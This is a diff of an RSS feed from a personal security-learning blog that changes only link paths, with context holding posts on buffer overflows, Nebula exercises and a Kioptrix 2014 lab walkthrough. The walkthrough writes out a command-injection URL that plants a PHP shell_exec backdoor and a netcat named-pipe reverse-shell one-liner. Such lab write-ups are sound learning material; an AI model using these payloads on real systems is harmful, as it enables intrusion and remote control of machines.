@@ -9,8 +9,8 @@
 
 <channel>
 	<title>Uncategorized &#8211; Graeme Robinson&#039;s blog</title>
-	<atom:link href="/category/uncategorized/feed/" rel="self" type="application/rss+xml" />
-	<link>/</link>
+	<atom:link href="/blog/category/uncategorized/feed/" rel="self" type="application/rss+xml" />
+	<link>/blog/</link>
 	<description>A place for my thoughts when I was starting to break into the information security feild</description>
 	<lastBuildDate>Fri, 20 Jul 2018 21:48:34 +0000</lastBuildDate>
 	<language>en-US</language>
@@ -21,8 +21,8 @@
 	<generator>https://wordpress.org/?v=6.6.2</generator>
 	<item>
 		<title>Learning more about buffer overflow exploits</title>
-		<link>/learning-more-about-buffer-overflow-exploits/</link>
-					<comments>/learning-more-about-buffer-overflow-exploits/#comments</comments>
+		<link>/blog/learning-more-about-buffer-overflow-exploits/</link>
+					<comments>/blog/learning-more-about-buffer-overflow-exploits/#comments</comments>
 		
 		<dc:creator><![CDATA[Graeme Robinson]]></dc:creator>
 		<pubDate>Fri, 20 Jul 2018 21:48:34 +0000</pubDate>
@@ -30,9 +30,9 @@
 		<category><![CDATA[Immunity]]></category>
 		<category><![CDATA[mona.py]]></category>
 		<category><![CDATA[Uncategorized]]></category>
-		<guid isPermaLink="false">/?p=342</guid>
+		<guid isPermaLink="false">/blog/?p=342</guid>
 
-					<description><![CDATA[Preamble After passing OSCP, I took a bit of a break from studying, but I&#8217;ve decided to get back on it and start learning more about exploit development, since that was part of the OSCP course that I found very &#8230; <a href="/learning-more-about-buffer-overflow-exploits/">Continue reading <span class="meta-nav">&#8594;</span></a>]]></description>
+					<description><![CDATA[Preamble After passing OSCP, I took a bit of a break from studying, but I&#8217;ve decided to get back on it and start learning more about exploit development, since that was part of the OSCP course that I found very &#8230; <a href="/blog/learning-more-about-buffer-overflow-exploits/">Continue reading <span class="meta-nav">&#8594;</span></a>]]></description>
 										<content:encoded><![CDATA[<h1>Preamble</h1>
 <p>After passing OSCP, I took a bit of a break from studying, but I&#8217;ve decided to get back on it and start learning more about exploit development, since that was part of the OSCP course that I found very interesting.</p>
 <p>I had heard about the <a href="https://www.corelan.be/index.php/2009/07/19/exploit-writing-tutorial-part-1-stack-based-overflows/">series of tutorials on the corelan blog</a> so I started to work through the first one and in doing so I hit a few problems and learned a few interesting things that I thought might be useful to others.</p>
@@ -154,15 +154,15 @@ with open(r"c:\documents and settings\administrator\desktop\mal.m3u", "w") as fi
 print "Done"</pre>
 ]]></content:encoded>
 					
-					<wfw:commentRss>/learning-more-about-buffer-overflow-exploits/feed/</wfw:commentRss>
+					<wfw:commentRss>/blog/learning-more-about-buffer-overflow-exploits/feed/</wfw:commentRss>
 			<slash:comments>1</slash:comments>
 		
 		
 			</item>
 		<item>
 		<title>Kioptrix 2014</title>
-		<link>/kioptrix-2014/</link>
-					<comments>/kioptrix-2014/#comments</comments>
+		<link>/blog/kioptrix-2014/</link>
+					<comments>/blog/kioptrix-2014/#comments</comments>
 		
 		<dc:creator><![CDATA[Graeme Robinson]]></dc:creator>
 		<pubDate>Thu, 12 Oct 2017 20:48:43 +0000</pubDate>
@@ -174,9 +174,9 @@ print "Done"</pre>
 		<category><![CDATA[Uncategorized]]></category>
 		<category><![CDATA[Unix]]></category>
 		<category><![CDATA[Web Server]]></category>
-		<guid isPermaLink="false">/?p=312</guid>
+		<guid isPermaLink="false">/blog/?p=312</guid>
 
-					<description><![CDATA[My lab time in the PWK course labs ran out a while back and I wasn&#8217;t ready for the exam. I think I understand all the theory that I need, it just takes m e too long to PWN systems, &#8230; <a href="/kioptrix-2014/">Continue reading <span class="meta-nav">&#8594;</span></a>]]></description>
+					<description><![CDATA[My lab time in the PWK course labs ran out a while back and I wasn&#8217;t ready for the exam. I think I understand all the theory that I need, it just takes m e too long to PWN systems, &#8230; <a href="/blog/kioptrix-2014/">Continue reading <span class="meta-nav">&#8594;</span></a>]]></description>
 										<content:encoded><![CDATA[<p>My lab time in the PWK course labs ran out a while back and I wasn&#8217;t ready for the exam. I think I understand all the theory that I need, it just takes m e too long to PWN systems, so I decided to try a few Vulnhub VMs. <a href="https://medium.com/@a.hilton83/oscp-training-vms-hosted-on-vulnhub-com-22fa061bf6a1">This article</a> has a list of 10 that I will be trying, the first of which is <a href="https://www.vulnhub.com/entry/kioptrix-2014-5,62/">Kioptrix 2014</a>.</p>
 <p>There are already walkthroughs all over the web, so I don&#8217;t feel like I&#8217;m giving away any spoilers here. I&#8217;m mostly documenting it for my own notes, but of course it can be used for hints if you&#8217;re going to give it a try.</p>
 <p>I wanted to run in in VirtualBox, which requires the use of the extra &#8220;kiop2014_fix.zip&#8221; file as wall as the VMDK from the main kiop2014.tar.bz2</p>
@@ -235,7 +235,7 @@ PhpTax - pfilez Parameter Exec Remote Code Injection (Metasploit) | php/webapps/
 phptax 0.8 - Remote Code Execution | php/webapps/21665.txt
 PhpTax 0.8 - File Manipulation (newvalue) / Remote Code Execution | php/webapps/25849.txt
 ------------------------------------------------------------------ ----------------------------------</pre>
-<p>The second one looks interesting, it basically says that we can get remote code execution because user input is not sanitised before being used in php&#8217;s exec() function. I&#8217;ll confirm this works by writing a <a href="/single-line-php-script-to-gain-shell/">single line php backdoor file</a> by visiting http://[IP-REDACTED]:8080/phptax/drawimage.php?pfilez=xxx;echo &#8220;&lt;?php echo shell_exec(\$_GET[&#8216;e&#8217;].&#8217; 2&gt;%261&#8242;);?&gt;&#8221;&gt;backdoor.php;&amp;pdf=make in my browser, then http://[IP-REDACTED]:8080/backdoor.php?e=whoami to make sure it worked. It did, and now I can execute shell commands <strong>and see the output</strong></p>
+<p>The second one looks interesting, it basically says that we can get remote code execution because user input is not sanitised before being used in php&#8217;s exec() function. I&#8217;ll confirm this works by writing a <a href="/blog/single-line-php-script-to-gain-shell/">single line php backdoor file</a> by visiting http://[IP-REDACTED]:8080/phptax/drawimage.php?pfilez=xxx;echo &#8220;&lt;?php echo shell_exec(\$_GET[&#8216;e&#8217;].&#8217; 2&gt;%261&#8242;);?&gt;&#8221;&gt;backdoor.php;&amp;pdf=make in my browser, then http://[IP-REDACTED]:8080/backdoor.php?e=whoami to make sure it worked. It did, and now I can execute shell commands <strong>and see the output</strong></p>
 <p>It would be really nice to have a remote shell. I tried using &#8220;nc &lt;IP&gt; &lt;PORT&gt; -e /bin/sh&#8221;, but that didn&#8217;t work and &#8220;nc -h&#8221; showed why; -e is for specifying an IPsec policy (whatever that means) on this version of nc. We&#8217;ll have to try something else; I remember some time ago that I was able to use a named fifo pipe in order to get a shell with nc. This command worked for me to connect to a netcat listener:</p>
 <pre>mkfifo pipe;nc [IP ADDR] [PORT]&lt;pipe|/bin/sh&gt;pipe 2&gt;pipe;rm pipe</pre>
 <p>Running &#8220;uname -r&#8221; tells us that we&#8217;re on a FreeBSD 9.0 system. Let&#8217;s try to get root. Back to searchsploit:</p>
@@ -271,87 +271,87 @@ root</pre>
 <p>I recently learned that <a href="http://www.kioptrix.com/blog/farewell-loneferret/">the guy that made this VM (Steven “loneferret” McElrea) passed away a couple of months ago</a>. I&#8217;m grateful for the time he put into making this VM and my thoughts go out to his family.</p>
 ]]></content:encoded>
 					
-					<wfw:commentRss>/kioptrix-2014/feed/</wfw:commentRss>
+					<wfw:commentRss>/blog/kioptrix-2014/feed/</wfw:commentRss>
 			<slash:comments>1</slash:comments>
 		
 		
 			</item>
 		<item>
 		<title>New alternate emoji domain</title>
-		<link>/new-alternate-emoji-domain/</link>
-					<comments>/new-alternate-emoji-domain/#respond</comments>
+		<link>/blog/new-alternate-emoji-domain/</link>
+					<comments>/blog/new-alternate-emoji-domain/#respond</comments>
 		
 		<dc:creator><![CDATA[Graeme Robinson]]></dc:creator>
 		<pubDate>Wed, 16 Aug 2017 14:27:14 +0000</pubDate>
 				<category><![CDATA[Uncategorized]]></category>
-		<guid isPermaLink="false">/?p=307</guid>
+		<guid isPermaLink="false">/blog/?p=307</guid>
 
-					<description><![CDATA[This is not really security related, but it&#8217;s a bit of fun so I wrote a quick post. I had heard that emoji domains are available from select TLDs, so I decided to buy one! I am now the proud &#8230; <a href="/new-alternate-emoji-domain/">Continue reading <span class="meta-nav">&#8594;</span></a>]]></description>
+					<description><![CDATA[This is not really security related, but it&#8217;s a bit of fun so I wrote a quick post. I had heard that emoji domains are available from select TLDs, so I decided to buy one! I am now the proud &#8230; <a href="/blog/new-alternate-emoji-domain/">Continue reading <span class="meta-nav">&#8594;</span></a>]]></description>
 										<content:encoded><![CDATA[<p>This is not really security related, but it&#8217;s a bit of fun so I wrote a quick post.</p>
 <p>I had heard that emoji domains are available from select TLDs, so I decided to buy one! I am now the proud owner of <img src="https://s.w.org/images/core/emoji/15.0.3/72x72/1f4bb.png" alt="💻" class="wp-smiley" style="height: 1em; max-height: 1em;" />☠.ws, which mirrors this site.</p>
 <p>Now, if you go to grobinson.me and your browser supports emoji domains without displaying the punycode translation (xn--h4h3030o.ws) in the address bar, you will be redirected to the same page on <img src="https://s.w.org/images/core/emoji/15.0.3/72x72/1f4bb.png" alt="💻" class="wp-smiley" style="height: 1em; max-height: 1em;" />☠.ws thanks to <a href="https://github.com/jonroig/emojiurlifier">this little piece of javascript</a>.</p>
 <p>Check your address bar now. You may already using the emoji domain without even knowing.</p>
 ]]></content:encoded>
 					
-					<wfw:commentRss>/new-alternate-emoji-domain/feed/</wfw:commentRss>
+					<wfw:commentRss>/blog/new-alternate-emoji-domain/feed/</wfw:commentRss>
 			<slash:comments>0</slash:comments>
 		
 		
 			</item>
 		<item>
 		<title>Hack the Box</title>
-		<link>/hack-the-box/</link>
-					<comments>/hack-the-box/#comments</comments>
+		<link>/blog/hack-the-box/</link>
+					<comments>/blog/hack-the-box/#comments</comments>
 		
 		<dc:creator><![CDATA[Graeme Robinson]]></dc:creator>
 		<pubDate>Mon, 26 Jun 2017 16:33:20 +0000</pubDate>
 				<category><![CDATA[Uncategorized]]></category>
-		<guid isPermaLink="false">/?p=290</guid>
+		<guid isPermaLink="false">/blog/?p=290</guid>
 
-					<description><![CDATA[I recently came across Hack The Box and have been having fun pwning some of those machines using the techniques that I have learned in the free Metasploit Unleashed course. Metasploit really is a great tool, and even though I could have &#8230; <a href="/hack-the-box/">Continue reading <span class="meta-nav">&#8594;</span></a>]]></description>
+					<description><![CDATA[I recently came across Hack The Box and have been having fun pwning some of those machines using the techniques that I have learned in the free Metasploit Unleashed course. Metasploit really is a great tool, and even though I could have &#8230; <a href="/blog/hack-the-box/">Continue reading <span class="meta-nav">&#8594;</span></a>]]></description>
 										<content:encoded><![CDATA[<p>I recently came across <a href="https://www.hackthebox.eu/">Hack The Box</a> and have been having fun pwning some of those machines using the techniques that I have learned in the free <a href="https://www.offensive-security.com/metasploit-unleashed/">Metasploit Unleashed</a> course. Metasploit really is a great tool, and even though I could have got some &#8220;user owns&#8221; without it, I found that once I had learned how to use things like msfvenom, it saved me having to write some of my own trivial scripts, which saved me time.</p>
 <p>I&#8217;ve currently got 3 &#8220;System Owns&#8221; and 4 &#8220;User Owns&#8221;, which puts me on &#8220;Script Kiddie&#8221; status. I&#8217;m hoping to get a few more and move to a better status fairly quickly, if I can find the time to play around some more.</p>
 <p>I especially like the way you have to <a href="https://www.hackthebox.eu/en/invite">hack the invite</a> before you can gain access to any machines. It was probably the easiest part of any of the challenges I have attempted, but that might be because I&#8217;m pretty familiar with web technologies.</p>
 <p>If you haven&#8217;t tried it out, I would encourage you to do so. The website is <strong>very</strong> polished, and there are quite a lot of machines to attack <img src="https://s.w.org/images/core/emoji/15.0.3/72x72/1f642.png" alt="🙂" class="wp-smiley" style="height: 1em; max-height: 1em;" /></p>
 ]]></content:encoded>
 					
-					<wfw:commentRss>/hack-the-box/feed/</wfw:commentRss>
+					<wfw:commentRss>/blog/hack-the-box/feed/</wfw:commentRss>
 			<slash:comments>1</slash:comments>
 		
 		
 			</item>
 		<item>
 		<title>I have a Raspberry PI on the way</title>
-		<link>/i-have-a-raspberry-pi-on-the-way/</link>
-					<comments>/i-have-a-raspberry-pi-on-the-way/#comments</comments>
+		<link>/blog/i-have-a-raspberry-pi-on-the-way/</link>
+					<comments>/blog/i-have-a-raspberry-pi-on-the-way/#comments</comments>
 		
 		<dc:creator><![CDATA[Graeme Robinson]]></dc:creator>
 		<pubDate>Sun, 06 Jan 2013 16:39:02 +0000</pubDate>
 				<category><![CDATA[Uncategorized]]></category>
-		<guid isPermaLink="false">/?p=238</guid>
+		<guid isPermaLink="false">/blog/?p=238</guid>
 
-					<description><![CDATA[I ordered a Raspberry PI yesterday. I used to have a server running at home which served files, recorded tv, provided VPN, but I moved into a small flat, and there&#8217;s not much room for a server, not that my &#8230; <a href="/i-have-a-raspberry-pi-on-the-way/">Continue reading <span class="meta-nav">&#8594;</span></a>]]></description>
+					<description><![CDATA[I ordered a Raspberry PI yesterday. I used to have a server running at home which served files, recorded tv, provided VPN, but I moved into a small flat, and there&#8217;s not much room for a server, not that my &#8230; <a href="/blog/i-have-a-raspberry-pi-on-the-way/">Continue reading <span class="meta-nav">&#8594;</span></a>]]></description>
 										<content:encoded><![CDATA[<p>I ordered a Raspberry PI yesterday.</p>
 <p>I used to have a server running at home which served files, recorded tv, provided VPN, but I moved into a small flat, and there&#8217;s not much room for a server, not that my fiancée would be happy with anyway!</p>
 <p>The PI will give me a little server back again for the duration that I&#8217;m in this flat. I&#8217;m also looking at playing with xbmc and perhaps some pvr capabilities on it. Should be fun!</p>
 ]]></content:encoded>
 					
-					<wfw:commentRss>/i-have-a-raspberry-pi-on-the-way/feed/</wfw:commentRss>
+					<wfw:commentRss>/blog/i-have-a-raspberry-pi-on-the-way/feed/</wfw:commentRss>
 			<slash:comments>1</slash:comments>
 		
 		
 			</item>
 		<item>
 		<title>Exploit Exercises – Nebula – Level 08</title>
-		<link>/exploit-exercises-nebula-level-08/</link>
-					<comments>/exploit-exercises-nebula-level-08/#respond</comments>
+		<link>/blog/exploit-exercises-nebula-level-08/</link>
+					<comments>/blog/exploit-exercises-nebula-level-08/#respond</comments>
 		
 		<dc:creator><![CDATA[Graeme Robinson]]></dc:creator>
 		<pubDate>Sat, 01 Dec 2012 12:17:44 +0000</pubDate>
 				<category><![CDATA[Uncategorized]]></category>
-		<guid isPermaLink="false">/?p=222</guid>
+		<guid isPermaLink="false">/blog/?p=222</guid>
 
-					<description><![CDATA[I must admit I needed a bit of help with his one, I had most of it but not quite all. It started with the following information: World readable files strike again. Check what that user was up to, and &#8230; <a href="/exploit-exercises-nebula-level-08/">Continue reading <span class="meta-nav">&#8594;</span></a>]]></description>
+					<description><![CDATA[I must admit I needed a bit of help with his one, I had most of it but not quite all. It started with the following information: World readable files strike again. Check what that user was up to, and &#8230; <a href="/blog/exploit-exercises-nebula-level-08/">Continue reading <span class="meta-nav">&#8594;</span></a>]]></description>
 										<content:encoded><![CDATA[<p>I must admit I needed a bit of help with his one, I had most of it but not quite all. It started with the following information:</p>
 <p style="text-align: left; padding-left: 30px;">World readable files strike again. Check what that user was up to, and use it to log into flag08 account.<br />
 To do this level, log in as the level08 account with the password level08 . Files for this level can be found in /home/flag08.</p>
@@ -361,22 +361,22 @@ To do this level, log in as the level08 account with the password level08 . File
 <p style="text-align: left;">
 ]]></content:encoded>
 					
-					<wfw:commentRss>/exploit-exercises-nebula-level-08/feed/</wfw:commentRss>
+					<wfw:commentRss>/blog/exploit-exercises-nebula-level-08/feed/</wfw:commentRss>
 			<slash:comments>0</slash:comments>
 		
 		
 			</item>
 		<item>
 		<title>Exploit Exercises – Nebula – Level 07</title>
-		<link>/exploit-exercises-nebula-level-07/</link>
-					<comments>/exploit-exercises-nebula-level-07/#respond</comments>
+		<link>/blog/exploit-exercises-nebula-level-07/</link>
+					<comments>/blog/exploit-exercises-nebula-level-07/#respond</comments>
 		
 		<dc:creator><![CDATA[Graeme Robinson]]></dc:creator>
 		<pubDate>Sat, 01 Dec 2012 11:58:49 +0000</pubDate>
 				<category><![CDATA[Uncategorized]]></category>
-		<guid isPermaLink="false">/?p=218</guid>
+		<guid isPermaLink="false">/blog/?p=218</guid>
 
-					<description><![CDATA[This one starts with the following information: The flag07 user was writing their very first perl program that allowed them to ping hosts to see if they were reachable from the web server. and Source code: #!/usr/bin/perl use CGI qw{param}; print &#34;Content-type: &#8230; <a href="/exploit-exercises-nebula-level-07/">Continue reading <span class="meta-nav">&#8594;</span></a>]]></description>
+					<description><![CDATA[This one starts with the following information: The flag07 user was writing their very first perl program that allowed them to ping hosts to see if they were reachable from the web server. and Source code: #!/usr/bin/perl use CGI qw{param}; print &#34;Content-type: &#8230; <a href="/blog/exploit-exercises-nebula-level-07/">Continue reading <span class="meta-nav">&#8594;</span></a>]]></description>
 										<content:encoded><![CDATA[<p>This one starts with the following information:</p>
 <p style="padding-left: 30px;">The <em>flag07</em> user was writing their very first perl program that allowed them to ping hosts to see if they were reachable from the web server.</p>
 <p>and Source code:</p>
@@ -429,29 +429,29 @@ ping(param(&quot;Host&quot;));
 <p>Now I can run any command including whoami and getflag</p>
 ]]></content:encoded>
 					
-					<wfw:commentRss>/exploit-exercises-nebula-level-07/feed/</wfw:commentRss>
+					<wfw:commentRss>/blog/exploit-exercises-nebula-level-07/feed/</wfw:commentRss>
 			<slash:comments>0</slash:comments>
 		
 		
 			</item>
 		<item>
 		<title>Internet censorship</title>
-		<link>/internet-censorship/</link>
-					<comments>/internet-censorship/#respond</comments>
+		<link>/blog/internet-censorship/</link>
+					<comments>/blog/internet-censorship/#respond</comments>
 		
 		<dc:creator><![CDATA[Graeme Robinson]]></dc:creator>
 		<pubDate>Mon, 08 Oct 2012 08:23:06 +0000</pubDate>
 				<category><![CDATA[Uncategorized]]></category>
-		<guid isPermaLink="false">/?p=128</guid>
+		<guid isPermaLink="false">/blog/?p=128</guid>
 
-					<description><![CDATA[My Finacee and I used to live on a farm just north of Bristol where the broadband options were pretty slim. While my friend in a town closer to London was getting 70Mb/s downstream, we were only offered 0.5Mb/s. I &#8230; <a href="/internet-censorship/">Continue reading <span class="meta-nav">&#8594;</span></a>]]></description>
+					<description><![CDATA[My Finacee and I used to live on a farm just north of Bristol where the broadband options were pretty slim. While my friend in a town closer to London was getting 70Mb/s downstream, we were only offered 0.5Mb/s. I &#8230; <a href="/blog/internet-censorship/">Continue reading <span class="meta-nav">&#8594;</span></a>]]></description>
 										<content:encoded><![CDATA[<p>My Finacee and I used to live on a farm just north of Bristol where the broadband options were pretty slim. While my friend in a town closer to London was getting 70Mb/s downstream, we were only offered 0.5Mb/s. I ended up getting a 3G dongle with a wireless 3G router and using HSPA+ on the three.co.uk network and we regularly managed speeds of around 7Mb/s (around 14x faster than we would have got if we used the phone line).</p>
 <p>We moved, this weekend, to a town closer to London, and I have left the dongle with the new tennants at the farm. I am currently researching what ISP I should go with. While looking at an ISP that I had been recommended (because of their technical expertise and support) I noticed a link to an article about the web censorship we are currently facing in the UK, and the reason that they do not censor on their network.</p>
 <p>It was not news to me, but I found it an interesting read anyway.</p>
 <p><a href="http://www.aa.net.uk/news-censorship.html" title="Article on Internet Censorship" target="_blank">The article can be found here</a>.</p>
 ]]></content:encoded>
 					
-					<wfw:commentRss>/internet-censorship/feed/</wfw:commentRss>
+					<wfw:commentRss>/blog/internet-censorship/feed/</wfw:commentRss>
 			<slash:comments>0</slash:comments>
 		
 		
